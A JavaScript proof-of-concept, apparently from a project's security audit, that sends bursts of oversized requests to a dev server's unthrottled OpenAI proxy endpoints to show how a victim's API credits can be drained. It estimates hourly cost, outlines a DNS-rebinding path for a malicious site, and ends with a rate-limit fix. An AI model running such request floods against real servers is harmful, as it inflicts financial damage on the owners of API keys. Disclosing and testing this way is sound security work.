/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║  POC #5 — OpenAI Cost Amplification (Wallet Drain)             ║
 * ║                                                                ║
 * ║  VULNERABILITY: server/providers/openai/hud-summary.js         ║
 * ║               + server/providers/openai/realtime.js            ║
 * ║                                                                ║
 * ║  The OpenAI proxy endpoints have rate limiting DISABLED by     ║
 * ║  default (GEV_RATELIMIT_OPENAI_PER_MIN is unset). Any client  ║
 * ║  on the network can make unlimited requests that consume the   ║
 * ║  victim's OpenAI API tokens.                                   ║
 * ║                                                                ║
 * ║  Combined with DNS rebinding (POC #1), a malicious website     ║
 * ║  can drain the victim's OpenAI credits without any throttle.   ║
 * ║                                                                ║
 * ║  IMPACT: High — Financial damage via unlimited API key abuse.  ║
 * ║  Each HUD summary call costs ~0.01-0.05 USD in tokens.        ║
 * ║  Each realtime session mints a 60-second ephemeral token.      ║
 * ║  At 100 req/sec, this drains ~$50-250/hour in OpenAI credits. ║
 * ║                                                                ║
 * ║  HOW TO REPRODUCE: node security/poc/05-openai-cost-drain.mjs  ║
 * ╚══════════════════════════════════════════════════════════════════╝
 */

const TARGET = process.env.TARGET || 'http://localhost:4173';

async function exploit() {
  console.log('=== POC #5: OpenAI Cost Amplification (Wallet Drain) ===\n');

  // Step 1: Verify rate limit is disabled (default)
  console.log('[1] Testing if OpenAI rate limit is active...');
  const BURST = 20;
  let hudOk = 0;
  let hudLimited = 0;
  let hudErrors = 0;

  const hudPromises = Array.from({ length: BURST }, async (_, i) => {
    try {
      const res = await fetch(`${TARGET}/api/openai/hud-summary`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        // Each request sends a large context to maximize token consumption
        body: JSON.stringify({
          place: 'A'.repeat(1000),           // Large place name
          street: 'B'.repeat(1000),           // Large street name
          nearbyPlaces: Array(50).fill('X'.repeat(100)),  // Many nearby places
          enabledLayers: Array(20).fill('layer-name'),     // Many layers
        }),
      });
      if (res.status === 429) { hudLimited++; return; }
      if (res.status === 502 || res.status === 503) { hudErrors++; return; }
      hudOk++;
    } catch { hudErrors++; }
  });

  await Promise.all(hudPromises);
  console.log(`  Burst of ${BURST} HUD summary requests:`);
  console.log(`    Processed: ${hudOk} (each costs OpenAI tokens)`);
  console.log(`    Rate-limited: ${hudLimited}`);
  console.log(`    Errors/no-key: ${hudErrors}`);

  // Step 2: Verify realtime token minting is unlimited
  console.log('\n[2] Testing realtime token minting rate...');
  let tokenOk = 0;
  let tokenLimited = 0;
  let tokenErrors = 0;

  const tokenPromises = Array.from({ length: BURST }, async () => {
    try {
      const res = await fetch(`${TARGET}/api/realtime/token`);
      if (res.status === 429) { tokenLimited++; return; }
      if (res.status === 503) { tokenErrors++; return; }
      tokenOk++;
    } catch { tokenErrors++; }
  });

  await Promise.all(tokenPromises);
  console.log(`  Burst of ${BURST} token mint requests:`);
  console.log(`    Processed: ${tokenOk} (each mints an OpenAI session)`);
  console.log(`    Rate-limited: ${tokenLimited}`);
  console.log(`    Errors/no-key: ${tokenErrors}`);

  // Step 3: Calculate financial impact
  console.log('\n[3] Financial impact estimation:');
  const HUD_COST_PER_CALL = 0.02;  // ~500 input + 100 output tokens at nano pricing
  const TOKEN_COST_PER_CALL = 0.10; // Each realtime session consumes minimum tokens

  if (hudLimited === 0 && tokenLimited === 0) {
    console.log('  ✓ VULNERABLE: Rate limiting is DISABLED by default');
    console.log('');
    console.log('  .env.example says:');
    console.log('    # DEFAULT IS UNLIMITED — unset (or 0) means no throttling');
    console.log('    # GEV_RATELIMIT_OPENAI_PER_MIN=30');
    console.log('');
    console.log('  With no rate limit, an attacker can sustain ~100 req/sec:');
    console.log(`    HUD summary:   100 req/sec × $${HUD_COST_PER_CALL}/req = $${(100 * HUD_COST_PER_CALL * 3600).toFixed(0)}/hour`);
    console.log(`    Token minting: 100 req/sec × $${TOKEN_COST_PER_CALL}/req = $${(100 * TOKEN_COST_PER_CALL * 3600).toFixed(0)}/hour`);
    console.log('');
    console.log('  Attack vector with DNS rebinding:');
    console.log('    1. Victim visits attacker page while GEV dev server runs');
    console.log('    2. DNS rebinding lands attacker script on localhost');
    console.log('    3. Script loops HUD summary + token minting calls');
    console.log('    4. Victim\'s OpenAI API key is drained without their knowledge');
    console.log('');
    console.log('  FIX: Enable rate limiting by DEFAULT, not opt-in.');
    console.log('  A safe default of 30 req/min/IP would prevent this.');
  } else {
    console.log('  Rate limiting is active — not vulnerable at default config.');
  }
}

exploit().catch(console.error);
